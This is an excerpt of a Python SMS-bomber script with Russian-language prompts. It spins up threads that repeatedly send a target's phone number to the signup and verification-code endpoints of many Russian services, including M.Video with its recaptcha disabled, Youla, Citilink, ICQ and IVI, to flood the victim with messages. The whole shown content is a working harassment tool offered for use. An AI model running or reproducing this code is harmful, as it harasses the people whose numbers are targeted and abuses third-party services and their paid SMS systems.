...
import asyncio
thr = 1
thr = int(input("Введите количество потоков: "))
...
def main(counet):
	...
	while i < 2:
		try:
			...
			async def part8():
				requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': formatted_phone})
			...
			async def part9():
				...
				requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": formatted_phone, "recaptcha": 'off', "g-recaptcha-response": ""})
			...
			async def part12():
				...
				requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': formatted_phone})
			async def part13():
				requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": formatted_phone, "deliveryOption": "sms"})
			...
			async def part14():
				...
				requests.post('https://www.citilink.ru/registration/confirm/phone/+' +formatted_phone + '/')
			async def part15():
				requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": formatted_phone, "SignupForm[device_type]": 3})
				requests.get('https://findclone.ru/register', params={'phone': '+' + formatted_phone})
				requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
			async def part16():
				requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': formatted_phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
				...
				requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + formatted_phone})
			async def part17():
				requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
				requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": formatted_phone})
			...
			asyncio.run(part17())
			iteration += 1
			print(('{} круг пройден. Поток {}').format(iteration, counet[0]))
		except Exception:
			pass
